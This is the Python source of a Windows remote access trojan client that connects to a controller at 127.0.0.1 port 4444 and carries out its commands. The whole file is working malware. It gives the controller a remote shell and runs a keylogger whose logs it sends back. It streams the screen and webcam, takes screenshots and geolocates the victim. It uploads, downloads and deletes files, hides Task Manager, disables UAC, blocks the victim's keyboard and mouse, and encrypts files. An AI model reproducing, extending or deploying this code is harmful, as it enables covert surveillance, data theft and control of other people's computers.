import random
import socket, subprocess, os, platform
from threading import Thread
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import ctypes
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard

from cryptography.fernet import Fernet, InvalidToken

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)
    
    def disable_all(self):
        while True:
            user32.BlockInput(True)
    
    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)
    
    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)
    
    def execute(self):
        while True:
            command = s.recv(1024).decode()
            
            if command == 'shell':
                while 1:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit' :
                        break
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()
            
            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    s.send("Impossible to get screen")
            
            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    s.send("Impossible to get webcam")
            
            elif command == 'breakstream':
                pass

            elif command == 'list':
                pass

            elif command == 'geolocate':
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                s.send(link.encode())
            
            elif command == 'volumeup':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'volumedown':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'setwallpaper':
                pic = s.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    s.send("No such file")

            elif command == 'usbdrivers':
                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                s.send(p.encode())
            
            elif command == 'monitors':
                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                s.send(p.encode())

            elif command == 'sysinfo':
                sysinfo = str(f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif command[:7] == 'writein':
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'readfile':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif command[:7] == 'abspath':
                try:
                    path = os.path.abspath(command[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif command == 'pwd':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())
            
            elif command == 'systeminfo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                s.send("Keyboard and mouse are disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                global kbrd
                kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                s.send("Keyboard is disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                global mousedbl
                mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                s.send("Mouse is disabled".encode())
            
            elif command == 'disableUAC':
                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd = False
                s.send("Mouse and keyboard are unblocked".encode())
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl = False
                s.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                s.send("Keyboard and mouse are enabled".encode())

            elif command == 'isuseradmin':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif command == 'keyscan_start':
                global klgr
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
            
            elif command == 'send_logs':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()
            
            elif command == 'stop_keylogger':
                klgr = False
                s.send("The session of keylogger is terminated".encode())
            
            elif command == 'cpu_cores':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif command[:8] == 'editfile':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cp':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'mv':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cd':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif command == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif command == 'curpid':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif command[:4] == 'kill':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif command[:9] == 'startfile':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'upload':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()
            
            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()
            
            elif command == 'browser':
                quiery = s.recv(6000)
                quiery = quiery.decode()
                try:
                    if re.search(r'\.', quiery):
                        webbrowser.open_new_tab('https://' + quiery)
                    elif re.search(r'\ ', quiery):
                        webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
                    else:
                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
                    s.send("The tab is opened".encode())
                except:
                    self.errorsend()
            
            elif command == 'screenshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
                    
            elif command == 'exit':
                s.send(b"exit")
                break
            
            # New commands
            
            elif command == 'whoami':
                try:
                    currentUser = subprocess.check_output("whoami", shell=True)
                    print(f"Current user: {currentUser.decode()}")
                    s.send(f"Current user: {currentUser.decode()}".encode())
                except subprocess.CalledProcessError as e:
                    print(f"Error executing whoami: {e}")
                    s.send(f"Error: Unable to fetch user".encode())
                        
            elif command.startswith("zipfile"):
                try:
                    _, filename = command.split(" ", 1)
                    zip_filename = f"{filename}.zip"
                    print(f"Creating ZIP file: {zip_filename} from {filename}")
                    with zipfile.ZipFile(zip_filename, 'w') as zipf:
                        if os.path.isfile(filename):
                            zipf.write(filename, arcname=os.path.basename(filename))
                        elif os.path.isdir(filename):
                            for root, dirs, files in os.walk(filename):
                                for file in files:
                                    full_path = os.path.join(root, file)
                                    zipf.write(full_path, arcname=os.path.relpath(full_path, filename))
                        else:
                            raise FileNotFoundError(f"File or directory '{filename}' not found")
                    s.send(f"File/directory '{filename}' zipped successfully to '{zip_filename}'".encode())
                except Exception as e:
                    s.send(f"Error zipping file: {e}".encode())

            elif command.startswith("unzipfile"):
                try:
                    _, zip_filename = command.split(" ", 1)
                    output_dir = zip_filename.replace('.zip', '')
                    print(f"Extracting ZIP file: {zip_filename} to {output_dir}")
                    with zipfile.ZipFile(zip_filename, 'r') as zipf:
                        zipf.extractall(output_dir)
                    s.send(f"ZIP file '{zip_filename}' extracted successfully to '{output_dir}'".encode())
                except Exception as e:
                    s.send(f"Error unzipping file: {e}".encode())

            elif command.startswith("renamefile"):
                try:
                    _, oldfilename, newfilename = command.split(" ", 2)
                    if not os.path.exists(oldfilename):
                        s.send(f"Error: File not found: {oldfilename}".encode())
                    else:
                        os.rename(oldfilename, newfilename)
                        s.send(f"File renamed from {oldfilename} to {newfilename}".encode())
                except Exception as e:
                    s.send(f"Error renaming file: {e}".encode())

            elif command == "clear":
                try:
                    if platform.system() == "Windows":
                        os.system('cls')
                    else:
                        os.system('clear')
                    s.send("Screen cleared successfully.".encode())
                except Exception as e:
                    s.send(f"Error clearing screen: {e}".encode())

            elif command.startswith("encryptfile"):
                try:
                    _, input_file, output_file, key = command.split(" ", 3)
                    key = key.encode()  # Convert key to bytes

                    if not os.path.exists(input_file):
                        s.send(f"Error: File '{input_file}' not found".encode())
                    else:
                        with open(input_file, 'rb') as f:
                            data = f.read()  # Read the bytes of the input file

                        fernet = Fernet(key)
                        encrypted = fernet.encrypt(data)

                        with open(output_file, 'wb') as f:
                            f.write(encrypted)  # Write the encrypted bytes to the output file

                        s.send(f"File '{input_file}' encrypted successfully to '{output_file}'".encode())
                except Exception as e:
                    s.send(f"Error encrypting file: {e}".encode())

            elif command.startswith("decryptfile"):
                try:
                    _, input_file, output_file, key = command.split(" ", 3)
                    key = key.encode()  # Convert key to bytes

                    if not os.path.exists(input_file):
                        s.send(f"Error: File '{input_file}' not found".encode())
                    else:
                        with open(input_file, 'rb') as f:
                            data = f.read()  # Read the bytes of the encrypted file

                        fernet = Fernet(key)
                        try:
                            decrypted = fernet.decrypt(data)
                            with open(output_file, 'wb') as f:
                                f.write(decrypted)  # Write the decrypted bytes to the output file

                            s.send(f"File '{input_file}' decrypted successfully to '{output_file}'".encode())
                        except InvalidToken:
                            s.send("Error: Invalid key. Decryption unsuccessful.".encode())
                except Exception as e:
                    s.send(f"Error decrypting file: {e}".encode())
                            
                    
                 

rat = RAT_CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()